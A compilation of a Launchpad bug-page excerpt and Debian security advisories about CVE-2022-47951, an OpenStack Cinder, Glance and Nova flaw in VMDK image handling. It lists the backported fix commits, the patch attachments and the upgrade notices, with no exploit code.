    (cherry picked from commit 930fc93e9fda82a4aa4568ae149c3c80af7379d0)

    (cherry picked from commit ba37dc2ead69c08d7ede242295ff997086e6121d)

    Conflicts:

      cinder/image/image\_utils.py

       - changed type annotations to use implicit Optional to be

         consistent with cinder yoga mypy usage

       - removed refs to image\_conversion\_disable in tests

    (cherry picked from commit 2ae5d53526e2b224d81b3259140c59aba97d72c3)

    (cherry picked from commit e96415409daa158cc503c1adec1ca1ca4f940082)

    Conflicts:

      cinder/image/image\_utils.py

       - removed type annotations

       - restored wallaby-era fetch\_verify\_image() function signature

    (cherry picked from commit be11d54ac420e0ebc0da6917d7ffc3af59b40f24)

    Conflicts:

      cinder/tests/unit/test\_image\_utils.py

       - did not include extraneous test from be11d54ac's parent commit

    Additions:

      cinder/image/image\_utils.py

       - added code to handle oslo.utils<4.1.0,>=3.14.0

      cinder/tests/unit/test\_image\_utils.py

       - added a test for ^^

    (cherry picked from commit 17565262dafb5beeaec8e9e249e760fc64f3df93)

    Conflicts:

      cinder/image/image\_utils.py

       - removed src\_passphrase\_file parameter to convert\_image() that was

         introduced in victoria by change I896f70d204ad103e

      cinder/tests/unit/test\_image\_utils.py

       - removed references to ddt.TestNameFormat (not present in this

         version of ddt)

    (cherry picked from commit 9902c17927b69e0b2379dfe8d2a2b89244162526)

    Additions:

      cinder/tests/unit/test\_image\_utils.py

       - added code to handle oslo.utils<4.1.0 when running unit tests under

         Python 2.7

Reviewed: https://review.opendev.org/c/openstack/cinder/+/871631
Committed: https://opendev.org/openstack/cinder/commit/e40a0bea89d4e5c99711f23faf3e18ff420ad100
Submitter: "Zuul (22348)"
Branch: stable/train
commit e40a0bea89d4e5c99711f23faf3e18ff420ad100
Author: Brian Rosmaita <rosmaita.fossdev@gmail.com>
Date: Mon Jan 16 14:44:04 2023 -0500
Check VMDK subformat against an allowed list
Also add a more general check to convert\_image that the image format
reported by qemu-img matches what the caller says it is.
Change-Id: I3c60ee4c0795aadf03108ed9b5a46ecd116894af
Partial-bug: #1996188
(cherry picked from commit 930fc93e9fda82a4aa4568ae149c3c80af7379d0)
(cherry picked from commit ba37dc2ead69c08d7ede242295ff997086e6121d)
Conflicts:
cinder/image/image\_utils.py
- changed type annotations to use implicit Optional to be
consistent with cinder yoga mypy usage
- removed refs to image\_conversion\_disable in tests
(cherry picked from commit 2ae5d53526e2b224d81b3259140c59aba97d72c3)
(cherry picked from commit e96415409daa158cc503c1adec1ca1ca4f940082)
Conflicts:
cinder/image/image\_utils.py
- removed type annotations
- restored wallaby-era fetch\_verify\_image() function signature
(cherry picked from commit be11d54ac420e0ebc0da6917d7ffc3af59b40f24)
Conflicts:
cinder/tests/unit/test\_image\_utils.py
- did not include extraneous test from be11d54ac's parent commit
Additions:
cinder/image/image\_utils.py
- added code to handle oslo.utils<4.1.0,>=3.14.0
cinder/tests/unit/test\_image\_utils.py
- added a test for ^^
(cherry picked from commit 17565262dafb5beeaec8e9e249e760fc64f3df93)
Conflicts:
cinder/image/image\_utils.py
- removed src\_passphrase\_file parameter to convert\_image() that was
introduced in victoria by change I896f70d204ad103e
cinder/tests/unit/test\_image\_utils.py
- removed references to ddt.TestNameFormat (not present in this
version of ddt)
(cherry picked from commit 9902c17927b69e0b2379dfe8d2a2b89244162526)
Additions:
cinder/tests/unit/test\_image\_utils.py
- added code to handle oslo.utils<4.1.0 when running unit tests under
Python 2.7

[Abhishek Kekane (abhishek-kekane)](https://launchpad.net/~abhishek-kekane)
on 2023-03-10

| Changed in glance: | |
| --- | --- |
| **assignee**: | nobody → Dan Smith (danms) |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-03-23:  [**Related fix merged to nova (stable/victoria)**](/nova/%2Bbug/1996188/comments/184) |  |  | [#184](/nova/%2Bbug/1996188/comments/184) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/nova/+/871699](https://review.opendev.org/c/openstack/nova/%2B/871699)

Committed: <https://opendev.org/openstack/nova/commit/eabb16a421326388c8d53a1b6ca47d79a03e0e16>

Submitter: "Zuul (22348)"

Branch: stable/victoria

commit eabb16a421326388c8d53a1b6ca47d79a03e0e16

Author: Dan Smith <email address hidden>

Date: Thu Nov 10 09:55:48 2022 -0800

[stable-only][cve] Check VMDK create-type against an allowed list

NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport

[1] <https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes>

Conflicts vs wallaby in:

            nova/conf/compute.py

            nova/tests/unit/virt/test\_images.py

Related-Bug: #1996188

    Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Reviewed: https://review.opendev.org/c/openstack/nova/+/871699
Committed: https://opendev.org/openstack/nova/commit/eabb16a421326388c8d53a1b6ca47d79a03e0e16
Submitter: "Zuul (22348)"
Branch: stable/victoria
commit eabb16a421326388c8d53a1b6ca47d79a03e0e16
Author: Dan Smith <dansmith@redhat.com>
Date: Thu Nov 10 09:55:48 2022 -0800
[stable-only][cve] Check VMDK create-type against an allowed list
NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport
[1] https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes
Conflicts vs wallaby in:
nova/conf/compute.py
nova/tests/unit/virt/test\_images.py
Related-Bug: #1996188
Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-05-03:  [**Change abandoned on cinder (stable/rocky)**](/nova/%2Bbug/1996188/comments/185) |  |  | [#185](/nova/%2Bbug/1996188/comments/185) |
| --- | --- | --- | --- |

Change abandoned by "Brian Rosmaita <email address hidden>" on branch: stable/rocky

Review: [https://review.opendev.org/c/openstack/cinder/+/871817](https://review.opendev.org/c/openstack/cinder/%2B/871817)

Reason: Rocky transitioned to End of Life by change I600914dd08e9 and is accepting no more changes.

Change abandoned by "Brian Rosmaita <rosmaita.fossdev@gmail.com>" on branch: stable/rocky
Review: https://review.opendev.org/c/openstack/cinder/+/871817
Reason: Rocky transitioned to End of Life by change I600914dd08e9 and is accepting no more changes.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2024-01-04:  [**Fix included in openstack/glance train-eol**](/nova/%2Bbug/1996188/comments/186) |  |  | [#186](/nova/%2Bbug/1996188/comments/186) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/glance train-eol release.

This issue was fixed in the openstack/glance train-eol release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2024-02-09:  [**Fix included in openstack/glance ussuri-eol**](/nova/%2Bbug/1996188/comments/187) |  |  | [#187](/nova/%2Bbug/1996188/comments/187) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/glance ussuri-eol release.

This issue was fixed in the openstack/glance ussuri-eol release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2024-03-07:  [**Fix included in openstack/glance victoria-eom**](/nova/%2Bbug/1996188/comments/188) |  |  | [#188](/nova/%2Bbug/1996188/comments/188) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/glance victoria-eom release.

This issue was fixed in the openstack/glance victoria-eom release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2024-03-07:  [**Fix included in openstack/glance wallaby-eom**](/nova/%2Bbug/1996188/comments/189) |  |  | [#189](/nova/%2Bbug/1996188/comments/189) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/glance wallaby-eom release.

This issue was fixed in the openstack/glance wallaby-eom release.

[See full activity log](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Bactivity)

Displaying first 40
and last 40
comments.
[View all 189
comments](/nova/%2Bbug/1996188?comments=all) or [add a comment](/nova/%2Bbug/1996188?comments=all).

* [Report a bug](/nova/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/nova/%2Bbug/1996188/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [nova-1996188.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5630408/%2Bfiles/nova-1996188.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5630408 "Change patch details")
* [nova-1996188-2.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5630610/%2Bfiles/nova-1996188-2.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5630610 "Change patch details")
* [glance-1996188.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5630734/%2Bfiles/glance-1996188.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5630734 "Change patch details")
* [glance-1996188-2.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5631413/%2Bfiles/glance-1996188-2.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5631413 "Change patch details")
* [cinder-1996188-master.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5635638/%2Bfiles/cinder-1996188-master.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5635638 "Change patch details")
* [cinder-1996188-zed.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5635639/%2Bfiles/cinder-1996188-zed.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5635639 "Change patch details")
* [cinder-1996188-yoga.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5635640/%2Bfiles/cinder-1996188-yoga.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5635640 "Change patch details")
* [cinder-1996188-xena.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5635641/%2Bfiles/cinder-1996188-xena.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5635641 "Change patch details")
* [glance-1996188-master.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5636450/%2Bfiles/glance-1996188-master.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5636450 "Change patch details")
* [glance-1996188-zed.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5636451/%2Bfiles/glance-1996188-zed.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5636451 "Change patch details")
* [glance-1996188-yoga.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5636452/%2Bfiles/glance-1996188-yoga.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5636452 "Change patch details")
* [glance-1996188-xena.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5636453/%2Bfiles/glance-1996188-xena.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5636453 "Change patch details")
* [glance-1996188-wallaby.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5636454/%2Bfiles/glance-1996188-wallaby.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5636454 "Change patch details")
* [glance-1996188-victoria.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5636455/%2Bfiles/glance-1996188-victoria.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5636455 "Change patch details")
* [glance-1996188-ussuri.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5636456/%2Bfiles/glance-1996188-ussuri.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5636456 "Change patch details")
* [glance-1996188-train.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5636457/%2Bfiles/glance-1996188-train.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5636457 "Change patch details")
* [nova-1996188-xena.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5640530/%2Bfiles/nova-1996188-xena.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5640530 "Change patch details")
* [cinder-1996188-wallaby.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5640733/%2Bfiles/cinder-1996188-wallaby.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5640733 "Change patch details")
* [cinder-1996188-victoria.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5641359/%2Bfiles/cinder-1996188-victoria.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5641359 "Change patch details")
* [cinder-1996188-ussuri.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5641756/%2Bfiles/cinder-1996188-ussuri.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5641756 "Change patch details")
* [cinder-1996188-train.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5641757/%2Bfiles/cinder-1996188-train.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5641757 "Change patch details")
* [cve-2022-47951-nova-stable-victoria.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5642746/%2Bfiles/cve-2022-47951-nova-stable-victoria.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5642746 "Change patch details")
* [nova-1996188-xena-2.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5642750/%2Bfiles/nova-1996188-xena-2.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5642750 "Change patch details")
* [cve-2022-47951-cinder-stable-queens-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643142/%2Bfiles/cve-2022-47951-cinder-stable-queens-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643142 "Change patch details")
* [cve-2022-47951-cinder-stable-rocky-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643143/%2Bfiles/cve-2022-47951-cinder-stable-rocky-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643143 "Change patch details")
* [cve-2022-47951-cinder-stable-stein-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643144/%2Bfiles/cve-2022-47951-cinder-stable-stein-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643144 "Change patch details")
* [cve-2022-47951-cinder-stable-ussuri-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643145/%2Bfiles/cve-2022-47951-cinder-stable-ussuri-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643145 "Change patch details")
* [cve-2022-47951-nova-stable-queens-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643146/%2Bfiles/cve-2022-47951-nova-stable-queens-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643146 "Change patch details")
* [cve-2022-47951-nova-stable-rocky-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643147/%2Bfiles/cve-2022-47951-nova-stable-rocky-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643147 "Change patch details")
* [cve-2022-47951-nova-stable-stein-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643148/%2Bfiles/cve-2022-47951-nova-stable-stein-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643148 "Change patch details")
* [cve-2022-47951-nova-stable-train-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643149/%2Bfiles/cve-2022-47951-nova-stable-train-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643149 "Change patch details")
* [cve-2022-47951-nova-stable-ussuri-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643150/%2Bfiles/cve-2022-47951-nova-stable-ussuri-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643150 "Change patch details")
* [cve-2022-47951-nova-stable-victoria-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643151/%2Bfiles/cve-2022-47951-nova-stable-victoria-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643151 "Change patch details")
* [cve-2022-47951-nova-stable-wallaby-felix.patch](https://bugs.launchpad.net/nova/%2Bbug/1996188/%2Battachment/5643152/%2Bfiles/cve-2022-47951-nova-stable-wallaby-felix.patch)
  [Edit](/nova/%2Bbug/1996188/%2Battachment/5643152 "Change patch details")

* [Add patch](/nova/%2Bbug/1996188/%2Baddcomment?field.patch=on)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
6394e03
([Get the code!](https://dev.launchpad.net/))



=== Content from lists.debian.org_293864de_20250114_210628.html ===


---

[[Date Prev](msg00040.html)][[Date Next](msg00042.html)]
[[Thread Prev](msg00040.html)][[Thread Next](msg00042.html)]
[[Date Index](maillist.html#00041)]
[[Thread Index](threads.html#00041)]

# [SECURITY] [DLA 3301-1] cinder security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3301-1] cinder security update
* *From*: Utkarsh Gupta <guptautkarsh2102@gmail.com>
* *Date*: Tue, 31 Jan 2023 03:40:12 +0530
* *Message-id*: <[[🔎]](/msgid-search/CAPP0f94pU60a4yVYMwU5vb4uZ2Lb-f3SQbX%3D97_74-CnYnsseQ%40mail.gmail.com) [CAPP0f94pU60a4yVYMwU5vb4uZ2Lb-f3SQbX=97\_74-CnYnsseQ@mail.gmail.com](msg00041.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

- -----------------------------------------------------------------------
Debian LTS Advisory DLA-3301-1              debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                      Utkarsh Gupta
January 31, 2023                            <https://wiki.debian.org/LTS>
- -----------------------------------------------------------------------

Package        : cinder
Version        : 2:13.0.7-1+deb10u2
CVE ID         : CVE-2022-47951
Debian Bug     : 1029562

An issue was discovered in OpenStack Cinder, a Block Storage service
for OpenStack. By supplying a specially created VMDK flat image that
references a specific backing file path, an authenticated user may
convince systems to return a copy of that file's contents from the
server, resulting in unauthorized access to potentially sensitive data.

For Debian 10 buster, this problem has been fixed in version
2:13.0.7-1+deb10u2.

We recommend that you upgrade your cinder packages.

For the detailed security status of cinder please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/cinder>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEbJ0QSEqa5Mw4X3xxgj6WdgbDS5YFAmPYQBwACgkQgj6WdgbD
S5Z/dQ/+MVK6S++td3cQr5y+QiWGqRevwsyJetZ6mIv2x0Tbg9LP4WrV6eoipda/
tEpolrqW+ob+Iqp3zM/HWaWDUZws0yHqzqdbI7qWQdjBBKHikb4w2QeDN4Gwf3Bh
iXtF/DqHvixZNEwI4V7MOPo8GwkgnCFsEXzldLUFnDS/vMVodgK8W8ChWZjhVnPf
NgJhqH4+Reh3p4YdvNCCOVd8ViT1MEt+E3dT2y94xpHqCLl5NICFxi4DGqASlhrs
awbKb/4dEDsfRdzxIe05HGiHj59m2AIFbflXJ9ZcxcaeYtL2RVkDJHo6UgX2Wa1w
2mw26/4pBku2YOHbr7cp2dGt4SkCEF7wMFkKtbEZ89YVodByDLk6ybzxAYS0pIdi
6lPHWRbxXb0GJg/twUnOiiAAiHY/Yvtkjofsc6CVQs6sFXTZsA/Au5l5Gu8HxK22
G8/KK1EEFHMTSZs96XyX9360jPtjPk3oK/2G266USQzwy+IBvYhky70xvDV04caB
IXV0PffmM2EJtHeTy7iXLA2iI4ZoMFuR7Imr1DJfi2cIZZWBsh8JK2BIX1CR6xS0
Stk+BkkrMOIpR0baBKmjwurSSuvBB0fzz7kjHNCX+llMF0cvxAFdfbTLOv0BBd51
MFaWxycL1ItrrNEXtAWcOsWmubxanw8KPVgZC5jP0c3eS7MdC+w=
=uOI9
-----END PGP SIGNATURE-----

```

---



=== Content from lists.debian.org_d91a67bb_20250114_210628.html ===


---

[[Date Prev](msg00039.html)][[Date Next](msg00041.html)]
[[Thread Prev](msg00039.html)][[Thread Next](msg00041.html)]
[[Date Index](maillist.html#00040)]
[[Thread Index](threads.html#00040)]

# [SECURITY] [DLA 3300-1] glance security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3300-1] glance security update
* *From*: Utkarsh Gupta <guptautkarsh2102@gmail.com>
* *Date*: Tue, 31 Jan 2023 03:34:57 +0530
* *Message-id*: <[[🔎]](/msgid-search/CAPP0f943appgAbVNcChyS1TZwJ4xjKtweRAH2RGYH9wUQ2GvYQ%40mail.gmail.com) [CAPP0f943appgAbVNcChyS1TZwJ4xjKtweRAH2RGYH9wUQ2GvYQ@mail.gmail.com](msg00040.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

- -----------------------------------------------------------------------
Debian LTS Advisory DLA-3300-1              debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                      Utkarsh Gupta
January 31, 2023                            <https://wiki.debian.org/LTS>
- -----------------------------------------------------------------------

Package        : glance
Version        : 2:17.0.0-5+deb10u1
CVE ID         : CVE-2022-47951
Debian Bug     : 1029563

An issue was discovered in Glance, OpenStack Image Registry and Delivery
Service - Daemons. By supplying a specially created VMDK flat image that
references a specific backing file path, an authenticated user may
convince systems to return a copy of that file's contents from the
server, resulting in unauthorized access to potentially sensitive data.

For Debian 10 buster, this problem has been fixed in version
2:17.0.0-5+deb10u1.

We recommend that you upgrade your glance packages.

For the detailed security status of glance please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/glance>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEbJ0QSEqa5Mw4X3xxgj6WdgbDS5YFAmPYPtQACgkQgj6WdgbD
S5Z4Mg//Z3XagcvJT7/JjuEiJWhLx2BItQi0j9lWGM1fvr4AHTDqeLBxJxo2Y3k/
TqTH3l7nTFf4Y48A2IdOKRhLZiOZss+udSdUrebwXOjaOlCT9eBLvjPCJIXc+i6q
ynfWvfNgUI16Y12BMtkCMeGP46+gCWNoyHdwdbwZfgWrLpC22PoMcirVVJIrjoqJ
t3nXSmKZ5H6yAbcPDn+fpFUSQ57hPHBAl64lD66pyMDN3+deO9UvYYXwSmDICz+U
Nql163K9dvx6cNsyhUq+NuCBA9QKPPV9YPdtu272AC7nFActGv7JS39L5hv98OLj
l/ACE9LR/+t4VL5PjWrSsbf37O+sDS2ICpmlaZNxtZ3q8/5DIWwyh5+xZ8r4SiN6
RZTt849vfXE8YYgbShJe7n5a78FBuDsXSbf6cf87Zs499k+jkPbDviLIe/QNS/eq
wFKdliZFoL+wGOq+NeT4EKRo9qXuzNRF+JD953NPwgvaDlLqHtP86s0TtaBhnymt
LM7PSwDwxRDpeTXaEmGWjzPs4itGKOEZSa0OTqeGHKuuwR0tC9tSQTS9jX4ablTn
dLuoi+r+TBlp/Q1Cf2mTJwmm4Fv5jmdi0RrYo/9X8SvNHf1WDSA0rnBsp1qTX6At
SNZmdn5GL7/Zhfcuq+Zby+TXIqyb4S8k3RTcRsi/Lx2ZEXXunvg=
=eNE1
-----END PGP SIGNATURE-----

```

---



=== Content from www.debian.org_eb2bfafb_20250114_210630.html ===


---

[[Date Prev](msg00026.html)][[Date Next](msg00028.html)]
[[Thread Prev](msg00026.html)][[Thread Next](msg00028.html)]
[[Date Index](maillist.html#00027)]
[[Thread Index](threads.html#00027)]

# [SECURITY] [DSA 5338-1] cinder security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5338-1] cinder security update
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Wed, 1 Feb 2023 18:33:57 +0000
* *Message-id*: <[[🔎]](/msgid-search/Y9qwlbGYFwu6BZ8c%40seger.debian.org) [Y9qwlbGYFwu6BZ8c@seger.debian.org](msg00027.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5338-1                   security@debian.org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
February 01, 2023                     <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : cinder
CVE ID         : CVE-2022-47951
Debian Bug     : 1029562

Guillaume Espanel, Pierre Libeau, Arnaud Morin and Damien Rannou
discovered that missing input sanitising in the handling of VMDK images
in Cinder, the OpenStack block storage system, may result in information
disclosure.

For the stable distribution (bullseye), this problem has been fixed in
version 2:17.0.1-1+deb11u1.

We recommend that you upgrade your cinder packages.

For the detailed security status of cinder please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/cinder>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAmParskACgkQEMKTtsN8
TjbMhxAAvApHGxPkLq1ldUi5fgMjTloVBouyRJS/Ytsq3p5U0Yx98SvnPI9ab9nL
RlWdVBjpdy9Wb6l0ouhaiiLR2kPJEv9D2Ux7oWdHpvexdtYs9eHdgx7Ym6Zibu6d
/7hMgxPaG8zKEwJLCf2zuMqXbr6l55ht+DAmFJrzO/VyQyU2mlhkSXvCdmL9NAX+
csEEW4WtLjx1MPD1gFz99uI3Q6DY3kTBu45BWG2xKkU0hHThsap0kRRK+6M9QINj
W2zylsyhW2pB5/0j5X8bUgMX9jDFNMj9p5tWcpN2FwQa6YvKQoIONHSNJIXEaOsH
iMXRQUGytS8UwW9UfDiPLzsKSreoaOaWzbtkvQvGrfauHmbySrVjZ2WCq+ZNiFGI
JV7EhlJstFi3IwlJ3oYlZgUHlLusNGahqQo+KD18ipVPiSE89LIM9Zq+p7KpjLLT
zjlSMgC7gLj4IJmCDRfxz7uxR0fUg/o9w0nhQNAr63hKbjzeJWDmRGQwpsuh/DBL
R7AgwwuqiMkpBj27uPMD/aPFisLysP8xmO7IJobfuZzdXU+mCQg0fbwMWWF3JQHc
ew971YDoreBB73Su9NsMVWrSgUd2WC4axp+EPFQTHNas6OLM+oEhpK/dUILczzy/
h9jPzH4wDAmQgv0nSOZSqGu7cuXSxsSGCzf8J8hpYoeysRn91Gc=
=NXlC
-----END PGP SIGNATURE-----

```

---



=== Content from www.debian.org_d4c117b9_20250114_210630.html ===


---

[[Date Prev](msg00024.html)][[Date Next](msg00026.html)]
[[Thread Prev](msg00024.html)][[Thread Next](msg00026.html)]
[[Date Index](maillist.html#00025)]
[[Thread Index](threads.html#00025)]

# [SECURITY] [DSA 5336-1] glance security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5336-1] glance security update
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Wed, 1 Feb 2023 18:32:49 +0000
* *Message-id*: <[[🔎]](/msgid-search/Y9qwUc%2BuWx3BmdiL%40seger.debian.org) [Y9qwUc+uWx3BmdiL@seger.debian.org](msg00025.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5336-1                   security@debian.org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
February 01, 2023                     <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : glance
CVE ID         : CVE-2022-47951
Debian Bug     : 1029563

Guillaume Espanel, Pierre Libeau, Arnaud Morin and Damien Rannou
discovered that missing input sanitising in the handling of VMDK images
in Glance, the OpenStack image registry and delivery service, may result
in information disclosure.

For the stable distribution (bullseye), this problem has been fixed in
version 2:21.0.0-2+deb11u1.

We recommend that you upgrade your glance packages.

For the detailed security status of glance please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/glance>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
